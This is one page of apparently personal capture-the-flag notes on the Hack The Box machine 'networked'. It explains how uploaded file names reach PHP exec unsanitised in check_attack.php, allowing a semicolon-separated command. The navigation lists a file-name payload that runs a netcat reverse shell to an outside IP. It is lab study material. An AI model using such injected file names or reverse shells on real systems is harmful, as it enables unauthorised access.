<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>scandir</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><strong>Index</strong></p>
<p><a href="HacktheBox--Linux_Boxes--networked.html">networked</a></p>

<ol>
<li><a href="HacktheBox--Linux_Boxes--networked--nmapAutomator.sh.html">nmapAutomator.sh</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--networked--nmapAutomator.sh--nmap.html">nmap</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--networked--nmapAutomator.sh--nmap--nmap_vulns.html">nmap vulns</a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--networked--nmapAutomator.sh--recon.html">recon</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--networked--nmapAutomator.sh--recon--gobuster.html">gobuster</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--networked--nmapAutomator.sh--recon--gobuster--index.php.html">index.php</a></li>
<li><a href="HacktheBox--Linux_Boxes--networked--nmapAutomator.sh--recon--gobuster---photos.php.html">/photos.php</a></li>
<li><a href="HacktheBox--Linux_Boxes--networked--nmapAutomator.sh--recon--gobuster--lib.php.html">lib.php</a></li>
<li><a href="HacktheBox--Linux_Boxes--networked--nmapAutomator.sh--recon--gobuster---upload.php.html">/upload.php</a></li>
<li><a href="HacktheBox--Linux_Boxes--networked--nmapAutomator.sh--recon--gobuster---uploads.html">/uploads</a></li>
<li><a href="HacktheBox--Linux_Boxes--networked--nmapAutomator.sh--recon--gobuster---backup.html">/backup</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--networked--nmapAutomator.sh--recon--gobuster---backup--extract_backup.tar.html">extract backup.tar</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Linux_Boxes--networked--nmapAutomator.sh--recon--nikto.html">nikto</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Linux_Boxes--networked--initial_foothold.html">initial foothold</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--networked--initial_foothold--upload.php_backup.html">upload.php backup</a></li>
<li><a href="HacktheBox--Linux_Boxes--networked--initial_foothold--magic_bytes_for_png.html">magic bytes for png</a></li>
<li><a href="HacktheBox--Linux_Boxes--networked--initial_foothold--upload_cmd.php.html">upload cmd.php</a></li>
<li><a href="HacktheBox--Linux_Boxes--networked--initial_foothold--cmd.php_RCE.html">cmd.php RCE</a></li>
<li><a href="HacktheBox--Linux_Boxes--networked--initial_foothold--reverse_shell.html">reverse shell</a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--networked--privesc_to_guly.html">privesc to guly</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--networked--privesc_to_guly--check_attack.php.html">check_attack.php</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--networked--privesc_to_guly--check_attack.php--exfiltrate_file_with_base64_encode.html">exfiltrate file with base64 encode</a></li>
<li><a href="HacktheBox--Linux_Boxes--networked--privesc_to_guly--check_attack.php--lib.php_changes.html">lib.php changes?</a></li>
<li><a href="HacktheBox--Linux_Boxes--networked--privesc_to_guly--check_attack.php--scandir.html">scandir</a></li>
<li><a href="HacktheBox--Linux_Boxes--networked--privesc_to_guly--check_attack.php--touch_--_';_nc_-c_bash_10.10.14.62_1234.php'.html">touch -- '; nc -c bash 10.10.14.62 1234.php'</a></li>
<li><a href="HacktheBox--Linux_Boxes--networked--privesc_to_guly--check_attack.php--reverse_shell.html">reverse shell</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Linux_Boxes--networked--priv_esc_to_root.html">priv esc to root</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--networked--priv_esc_to_root--changename.sh.html">changename.sh</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--networked--priv_esc_to_root--changename.sh--vuln.html">vuln</a></li>
<li><a href="HacktheBox--Linux_Boxes--networked--priv_esc_to_root--changename.sh--POC.html">POC</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Linux_Boxes--networked--user-root.html">user/root</a></li>
<li><a href="HacktheBox--Linux_Boxes--networked--lessons_learned.html">lessons learned</a></li>
</ol></div>
<div class="page"><h1><b><u>scandir</u></b></h1><img src="images/1254-1.png" alt="images/1254-1.png" /><span style="color:#24ff00;"><br />lets see exactly what </span><span style="color:#ffa500;">scandir</span><span style="color:#24ff00;"> does using our own environment<br /><br /></span><img src="images/1254-2.png" alt="images/1254-2.png" /><br /><br />we see it scans the directory its in!<br /><img src="images/1254-3.png" alt="images/1254-3.png" /><br /><br />now looking at <span style="color:#ffa500;">check_attack.php</span><br /><img src="images/1254-4.png" alt="images/1254-4.png" /><br /><br />we see we have control of the <span style="color:#ffa500;">$value</span><span style="color:#24ff00;"> parameter since we can upload files to our victim, we just need to name the file something malicious and it will get executed by php </span><span style="color:#ffa500;">exec</span><span style="color:#24ff00;"> without any sanitation!<br /><br />exec can run multiple commands on one line if separated by a semi-colon so lets use that to our advantage here and get a little creative<br /><br /></span><img src="images/1254-5.png" alt="images/1254-5.png" /><br />if we separate <span style="color:#ffa500;">$path </span><span style="color:#24ff00;">and </span><span style="color:#ffa500;">$value</span><span style="color:#24ff00;"> with a semicolon ‘;’ we can write malicious code after it<br /><br /><br /><br /></span></div></div>
</body></html>